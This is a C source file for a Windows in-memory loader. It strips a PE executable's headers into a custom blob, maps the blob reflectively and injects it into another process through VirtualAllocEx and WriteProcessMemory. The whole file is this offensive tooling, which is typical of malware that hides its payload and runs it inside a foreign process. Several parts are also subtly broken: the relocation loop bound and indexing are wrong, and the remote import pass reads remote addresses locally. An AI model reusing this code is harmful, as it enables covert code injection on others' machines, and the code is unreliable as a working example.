#include "HeaderLessPE.h"
#include <winnt.h>

typedef void(*__cdecl pfnmemcpy)(
	_Out_writes_bytes_all_(_Size) void* _Dst,
	_In_reads_bytes_(_Size)       void const* _Src,
	_In_                          size_t      _Size
);

typedef void(*__cdecl pfnmemset)(
	_Out_writes_bytes_all_(_Size) void* _Dst,
	_In_                          int    _Val,
	_In_                          size_t _Size
);

BOOL pe2headerless(BYTE* image, PHeaderLessPE* header_less_pe, SIZE_T* length)
{
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)image;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(image + dos->e_lfanew);

	DWORD needSize = sizeof(HeaderLessPE) + (nt->FileHeader.NumberOfSections - 1) * sizeof(HeaderLessSection);

	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
	for (size_t i = 0; i < nt->FileHeader.NumberOfSections; i++)
	{
		needSize += section[i].SizeOfRawData;
	}

	PHeaderLessPE headless = (PHeaderLessPE)VirtualAlloc(NULL, needSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (headless)
	{
		pfnmemset memset = (pfnmemset)GetProcAddress(GetModuleHandleA("ntdll"), "memset");
		memset(headless, 0, needSize);

		headless->ImageBase = (PVOID)nt->OptionalHeader.ImageBase;
		headless->ImageEntryPoint = nt->OptionalHeader.AddressOfEntryPoint;
		headless->ImageSize = nt->OptionalHeader.SizeOfImage;

		headless->ResourceTableVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress;
		headless->ResourceTableSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].Size;
		headless->ImportTableVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
		headless->RelocTableVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		headless->RelocTableSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
		headless->SectionCount = nt->FileHeader.NumberOfSections;

		DWORD dataOffset = sizeof(HeaderLessPE) + (nt->FileHeader.NumberOfSections - 1) * sizeof(HeaderLessSection);
		for (size_t i = 0; i < headless->SectionCount; i++)
		{
			headless->Section[i].VA = section[i].VirtualAddress;
			headless->Section[i].VirtualSize = section[i].SizeOfRawData;
			headless->Section[i].RawSize = section[i].SizeOfRawData;
			headless->Section[i].RawOffset = dataOffset;

			if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
				headless->Section[i].Access = PAGE_WRITECOPY;
			}
			if (section[i].Characteristics & IMAGE_SCN_MEM_READ) {
				headless->Section[i].Access = PAGE_READONLY;
			}
			if ((section[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (section[i].Characteristics & IMAGE_SCN_MEM_READ)) {
				headless->Section[i].Access = PAGE_READWRITE;
			}
			if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
				headless->Section[i].Access = PAGE_EXECUTE;
			}
			if ((section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (section[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
				headless->Section[i].Access = PAGE_EXECUTE_WRITECOPY;
			}
			if ((section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (section[i].Characteristics & IMAGE_SCN_MEM_READ)) {
				headless->Section[i].Access = PAGE_EXECUTE_READ;
			}
			if ((section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (section[i].Characteristics & IMAGE_SCN_MEM_READ)) {
				headless->Section[i].Access = PAGE_EXECUTE_READWRITE;
			}

			pfnmemcpy memcpy = (pfnmemcpy)GetProcAddress(GetModuleHandleA("ntdll"), "memcpy");
			memcpy((PBYTE)headless + dataOffset, image + section[i].PointerToRawData, section[i].SizeOfRawData);
			dataOffset += section[i].SizeOfRawData;
		}

		*header_less_pe = headless;
		*length = needSize;
		return TRUE;
	}

	return FALSE;
}

FARPROC LoadHeaderLessPE(BYTE* blob, BYTE* args, HINSTANCE *instance)
{
	FARPROC entry = NULL;
	PHeaderLessPE pe = (PHeaderLessPE)blob;
	if (pe)
	{
		if (pe->ImageBase && pe->ImageSize)
		{
			PBYTE image = (PBYTE)VirtualAlloc(pe->ImageBase, pe->ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			if (image == 0)
			{
				image = (PBYTE)VirtualAlloc(NULL, pe->ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			}
			if (image)
			{
				// copy section
				for (size_t i = 0; i < pe->SectionCount; i++)
				{
					PHeaderLessSection header = &(pe->Section[i]);
					PBYTE raw = blob + header->RawOffset;
					PBYTE section_blob = image + header->VA;
					if (header->RawSize > header->VirtualSize) {
						for (size_t j = 0; j < header->VirtualSize; j++)
						{
							section_blob[j] = raw[j];
						}
					}
					else if (header->RawSize <= header->VirtualSize) {
						for (size_t j = 0; j < header->RawSize; j++)
						{
							section_blob[j] = raw[j];
						}
					}

				}

				// reloc
				if (pe->ImageBase != image)
				{
					DWORD delta = (DWORD)((LPBYTE)image - (LPBYTE)pe->ImageBase);

					PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(image + pe->RelocTableVA);
					for (; reloc->VirtualAddress > 0; reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock))
					{
						PBYTE dest = image + reloc->VirtualAddress;
						unsigned short* relInfo = (unsigned short*)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
						for (size_t i = 0; i < reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) / 2; i++, relInfo++)
						{
							int type = relInfo[i] >> 12;
							int offset = relInfo[i] & 0xFFF;
							switch (type)
							{
							case IMAGE_REL_BASED_HIGHLOW:
								// change complete 32 bit address
							{
								DWORD* patchAddrHL = (DWORD*)(dest + offset);
								*patchAddrHL += (DWORD)delta;
							}
							break;
							case IMAGE_REL_BASED_DIR64:
							{
								ULONGLONG* patchAddr64 = (ULONGLONG*)(dest + offset);
								*patchAddr64 += (ULONGLONG)delta;
							}
							break;
							case IMAGE_REL_BASED_ABSOLUTE:
								// skip relocation
							default:
								//printf("Unknown relocation: %d\n", type);
								break;
							}
						}
					}
				}

				PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)image + pe->ImportTableVA);
				for (; !IsBadReadPtr((PVOID)importDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR)) && importDesc->Name; importDesc++)
				{
					LPCSTR name = (LPCSTR)((PBYTE)image + importDesc->Name);
					HMODULE module = LoadLibraryA(name);
					if (module)
					{
						PIMAGE_THUNK_DATA funcRef, thunkRef = NULL;
						if (importDesc->OriginalFirstThunk)
						{
							thunkRef = (PIMAGE_THUNK_DATA)((PBYTE)image + importDesc->OriginalFirstThunk);
							funcRef = (PIMAGE_THUNK_DATA)((PBYTE)image + importDesc->FirstThunk);
						}
						else {
							thunkRef = (PIMAGE_THUNK_DATA)((PBYTE)image + importDesc->FirstThunk);
							funcRef = (PIMAGE_THUNK_DATA)((PBYTE)image + importDesc->FirstThunk);
						}

						for (; thunkRef->u1.AddressOfData; thunkRef++, funcRef++)
						{
							if (IMAGE_SNAP_BY_ORDINAL(thunkRef->u1.Ordinal))
							{
								funcRef->u1.Function = (ULONGLONG)GetProcAddress(module, (LPSTR)IMAGE_ORDINAL(thunkRef->u1.Ordinal));
							}
							else {
								PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)((PBYTE)image + thunkRef->u1.AddressOfData);
								funcRef->u1.Function = (ULONGLONG)GetProcAddress(module, (LPSTR)thunkData->Name);
							}
						}
					}
				}

				// adjust priviage 
				for (size_t i = 0; i < pe->SectionCount; i++)
				{
					DWORD old;
					PHeaderLessSection header = &(pe->Section[i]);
					VirtualProtect((PBYTE)image + header->VA, header->VirtualSize, header->Access, &old);
				}

				*instance = (HINSTANCE)image;
				entry = (FARPROC)((PBYTE)image + pe->ImageEntryPoint);
			}
		}
	}

	return entry;
}

FARPROC SpawnHeaderLessPE(PHeaderLessPE pe, HANDLE hTarget, BYTE* args) 
{
	FARPROC entry = NULL;
	PBYTE blob = (PBYTE)pe;
	PBYTE remoteImage = (PBYTE)VirtualAllocEx(hTarget, (PBYTE)pe->ImageBase, pe->ImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PBYTE localImage = (PBYTE)VirtualAlloc(pe->ImageBase, pe->ImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (localImage && remoteImage)
	{
		// copy section
		for (size_t i = 0; i < pe->SectionCount; i++)
		{
			PHeaderLessSection header = &(pe->Section[i]);
			PBYTE raw = blob + header->RawOffset;
			PBYTE section_blob = localImage + header->VA;
			for (size_t j = 0; j < header->RawSize; j++)
			{
				section_blob[j] = raw[j];
			}
		}

		// reloc
		if (pe->ImageBase != remoteImage)
		{
			DWORD delta = (DWORD)((LPBYTE)remoteImage - (LPBYTE)pe->ImageBase);

			PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(localImage + pe->RelocTableVA);
			for (; reloc->VirtualAddress > 0; reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock))
			{
				PBYTE dest = localImage + reloc->VirtualAddress;
				unsigned short* relInfo = (unsigned short*)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
				for (size_t i = 0; i < reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) / 2; i++, relInfo++)
				{
					int type = relInfo[i] >> 12;
					int offset = relInfo[i] & 0xFFF;
					switch (type)
					{
					case IMAGE_REL_BASED_HIGHLOW:
						// change complete 32 bit address
					{
						DWORD* patchAddrHL = (DWORD*)(dest + offset);
						*patchAddrHL += (DWORD)delta;
					}
					break;
					case IMAGE_REL_BASED_DIR64:
					{
						ULONGLONG* patchAddr64 = (ULONGLONG*)(dest + offset);
						*patchAddr64 += (ULONGLONG)delta;
					}
					break;
					case IMAGE_REL_BASED_ABSOLUTE:
						// skip relocation
					default:
						//printf("Unknown relocation: %d\n", type);
						break;
					}
				}
			}
		}

		PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)remoteImage + pe->ImportTableVA);
		for (; !IsBadReadPtr((PVOID)importDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR)) && importDesc->Name; importDesc++)
		{
			LPCSTR name = (LPCSTR)((PBYTE)remoteImage + importDesc->Name);
			HMODULE module = LoadLibraryA(name);
			if (module)
			{
				PIMAGE_THUNK_DATA funcRef, thunkRef = NULL;
				if (importDesc->OriginalFirstThunk)
				{
					thunkRef = (PIMAGE_THUNK_DATA)((PBYTE)remoteImage + importDesc->OriginalFirstThunk);
					funcRef = (PIMAGE_THUNK_DATA)((PBYTE)remoteImage + importDesc->FirstThunk);
				}
				else {
					thunkRef = (PIMAGE_THUNK_DATA)((PBYTE)remoteImage + importDesc->FirstThunk);
					funcRef = (PIMAGE_THUNK_DATA)((PBYTE)remoteImage + importDesc->FirstThunk);
				}

				for (; thunkRef->u1.AddressOfData; thunkRef++, funcRef++)
				{
					if (IMAGE_SNAP_BY_ORDINAL(thunkRef->u1.Ordinal))
					{
						funcRef->u1.Function = (ULONGLONG)GetProcAddress(module, (LPSTR)IMAGE_ORDINAL(thunkRef->u1.Ordinal));
					}
					else {
						PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)((PBYTE)remoteImage + thunkRef->u1.AddressOfData);
						funcRef->u1.Function = (ULONGLONG)GetProcAddress(module, (LPSTR)thunkData->Name);
					}
				}
			}
		}

		SIZE_T write;
		WriteProcessMemory(hTarget, remoteImage, localImage, pe->ImageSize, &write);

		// adjust priviage 
		for (size_t i = 0; i < pe->SectionCount; i++)
		{
			DWORD old;
			PHeaderLessSection header = &(pe->Section[i]);
			VirtualProtectEx(hTarget, (PBYTE)remoteImage + header->VA, header->VirtualSize, header->Access, &old);
		}

		entry = (FARPROC)((PBYTE)remoteImage + pe->ImageEntryPoint);
		//LocalFree(localImage);
	}

	return entry;
}


